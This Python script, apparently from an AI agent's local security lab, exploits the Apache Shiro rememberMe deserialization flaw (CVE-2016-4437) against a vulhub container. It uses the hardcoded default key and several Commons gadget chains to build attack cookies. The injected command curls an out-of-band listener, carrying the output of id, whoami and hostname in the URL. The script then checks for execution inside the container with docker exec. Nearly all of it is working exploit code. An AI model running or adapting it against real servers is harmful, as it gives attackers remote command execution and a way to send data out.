#!/usr/bin/env python3
# loop3 t7 C1 — 正式利用取证（干净 cookie 版）
# 三个独立判据：
#   J1 OOB：命令 curl 回连宿主接收端，URL 路径携带 `id`/`whoami`/`hostname` 输出 -> 命令执行 + 回显
#   J2 /proc：容器内出现 gadget 命令的进程快照
#   J3 反序列化确认：容器日志出现 ObjectInputStream / ClassResolvingObjectInputStream 调用链
import json, os, re, subprocess, sys, time, datetime
import requests

CWD = r"C:\Users\Administrator\Documents\deepseek-harness\default-workspace"
EV = os.path.join(CWD, r"security\learning\_evidence")
SHIRO = "http://127.0.0.1:18081/"
OOB_HOST = "192.168.65.254"
OOB_PORT = 8099
OOB_LOG = os.path.join(EV, "loop3-t7-c1-oob.jsonl")
OUT_PATH = os.path.join(EV, "loop3-t7-c1-shiro-20261012.json")
UA = "loop3-t7/1.0 (authorized local lab)"
KEY = "kPH+bIxk5D2deZiIxcaaaA=="
OUT = {"ts": datetime.datetime.now().isoformat(), "target": SHIRO,
       "cve": "CVE-2016-4437 (Apache Shiro rememberMe deserialization)",
       "key_used": KEY,
       "key_provenance": "Shiro 1.2.4 hardcoded default key in AbstractRememberMeManager.DEFAULTCIPHERKEY; "
                         "ShiroConfig.class uses new CookieRememberMeManager() (no custom key set)",
       "steps": [], "results": []}


def rec(n, **kw):
    OUT["steps"].append({"step": n, **kw})
    print(f"--- {n}: " + json.dumps(kw, ensure_ascii=False)[:800], flush=True)
    return kw


def kali(cmd):
    r = subprocess.run([sys.executable, r"dsh-tools\kali-run.py", cmd],
                       capture_output=True, text=True, cwd=CWD)
    return r.stdout + r.stderr


def clean_b64(s):
    m = re.findall(r"[A-Za-z0-9+/]{40,}={0,2}", s)
    return max(m, key=len) if m else ""


def oob_hits(tag):
    if not os.path.exists(OOB_LOG):
        return []
    hits = []
    with open(OOB_LOG, encoding="utf-8", errors="replace") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            try:
                e = json.loads(line)
                if tag in (e.get("path") or ""):
                    hits.append(e)
            except Exception:
                pass
    return hits


def gen(chain, cmd, outfile):
    r = kali(f"ruby /tmp/t7-c1-shiro-gen.rb {chain} '{cmd}' {outfile} '{KEY}' 2>&1")
    meta = [l for l in r.splitlines() if l.startswith(("SER_LEN", "COOKIE_LEN"))]
    return clean_b64(kali(f"cat {outfile}")), " | ".join(meta)


def send(ck, timeout=45):
    time.sleep(1.2)
    r = requests.get(SHIRO, headers={"User-Agent": UA, "Cookie": "rememberMe=" + ck},
                     timeout=timeout, allow_redirects=False)
    return {"status": r.status_code,
            "deleteMe": ("rememberMe=deleteMe" in r.headers.get("Set-Cookie", ""))}


print("=" * 78)
rec("oracle_calibration_note",
    finding="deleteMe 仅表示 RememberMeManager 未能取出合法 PrincipalCollection；"
            "合法 Java 序列化 String 同样得到 deleteMe=true -> 该标志【不能】区分"
            "解密成功/失败，也不能判定 RCE。故本轮改用 OOB + /proc 双硬证据。")

# ---- J1: OOB 外带（命令输出经 URL 路径带回宿主接收端）----
CHAINS = ["CommonsBeanutils1", "CommonsCollections5", "CommonsCollections6", "CommonsCollections2"]
for chain in CHAINS:
    tag = f"t7c1-{chain}"
    # $(id) 输出含空格/斜杠，做 base64 打包避免 URL 破坏；只读命令
    cmd = f"curl -s http://{OOB_HOST}:{OOB_PORT}/{tag}-$(id -u)-$(whoami)-$(hostname)"
    ck, meta = gen(chain, cmd, f"/tmp/t7-oob2-{chain}.txt")
    if not ck:
        rec(f"{chain}_SKIP", reason="cookie empty")
        continue
    before = len(oob_hits(tag))
    resp = send(ck)
    time.sleep(2.5)
    hits = oob_hits(tag)
    entry = {"chain": chain, "cookie_len": len(ck), "gen_meta": meta,
             "response": resp, "oob_hits_before": before, "oob_hits": len(hits),
             "oob_paths": [h["path"] for h in hits][:3],
             "oob_client": [h.get("client") for h in hits][:3]}
    OUT["results"].append(entry)
    print(f">>> {chain}: oob_hits={len(hits)} status={resp['status']}", flush=True)

# ---- J2: /proc 进程快照（命令 = sleep 10，只读无害）----
ck2, meta2 = gen("CommonsCollections6", "sleep 10", "/tmp/t7-proc-cc6.txt")
if ck2:
    rec("J2_prepare", chain="CommonsCollections6", cmd="sleep 10", cookie_len=len(ck2), meta=meta2)
    with open(os.path.join(EV, "t7-pw-ck-clean.txt"), "w", encoding="ascii") as f:
        f.write(ck2)
    r = subprocess.run(
        ["docker", "cp", os.path.join(EV, "t7-pw-ck-clean.txt"), "vulhub-shiro-18081:/tmp/pw-ck.txt"],
        capture_output=True, text=True)
    rec("J2_copy_cookie", rc=r.returncode, out=(r.stdout + r.stderr).strip()[:200])
    r = subprocess.run(["docker", "exec", "vulhub-shiro-18081", "bash", "/tmp/pw-inner.sh"],
                       capture_output=True, text=True, timeout=180)
    out = r.stdout + r.stderr
    found = [l for l in out.splitlines() if "FOUND_PROC" in l]
    rec("J2_proc_watch", sleep_procs_found=len(found), sample=found[:3],
        proc_count_lines=[l for l in out.splitlines() if l.startswith(("sleep_procs_found", "proc_count"))])

rec("summary", results=[{"chain": r["chain"], "oob_hits": r["oob_hits"]} for r in OUT["results"]])

with open(OUT_PATH, "w", encoding="utf-8") as f:
    json.dump(OUT, f, ensure_ascii=False, indent=1)
print(json.dumps({"rc": "ok", "chains": len(OUT["results"])}))
